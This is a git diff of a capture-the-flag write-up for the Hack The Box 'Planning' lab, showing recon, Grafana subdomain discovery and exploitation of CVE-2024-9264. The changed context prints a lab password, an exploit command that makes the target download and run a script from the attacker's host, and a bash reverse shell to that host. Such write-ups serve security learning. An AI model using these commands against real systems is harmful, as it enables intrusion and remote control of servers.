@@ -2,7 +2,7 @@ In this writeup we will talk about planning lab which is an easy lab in Hack the
 
 # nmap
 
-![image.png](attachment:25488740-a40f-45db-a6f2-cde871697eee:image.png)
+![nmap](images/nmap.png)
 
 with this nmap scan we can see http is open but when you go to the host it says planning.htb so you need to add planning.htb in /etc/hosts file
 
@@ -10,7 +10,7 @@ with this nmap scan we can see http is open but when you go to the host it says 
 
 after going to planning.htb you will notice its just a courses website. but here comes the subdomain enumeration
 
-using ffuf or any subdomain enumeration you will notice theres a grafana.planning.htb 
+using ffuf or any subdomain enumeration you will notice theres a grafana.planning.htb
 
 then you will use the provided credentials and you will notice the version of grafana is 11.0.0 which is vulnerable to **CVE-2024-9264**
 
@@ -22,7 +22,7 @@ git clone it then you will need to make a reverse shell to gain shell
 
 `python3 [CVE-2024-9264.py](http://cve-2024-9264.py/) -u admin -p 0D5oT70Fq13EvB5r -c "wget http://10.10.16.99:8000/rev.sh -O /tmp/rev.sh && chmod +x /tmp/rev.sh && /tmp/rev.sh" [http://grafana.planning.htb](http://grafana.planning.htb/)`
 
-the [rev.sh](http://rev.sh) ⇒ 
+the [rev.sh](http://rev.sh) ⇒
 
 `#!/bin/bash
 bash -i >& /dev/tcp/10.10.16.99/9090 0>&1`
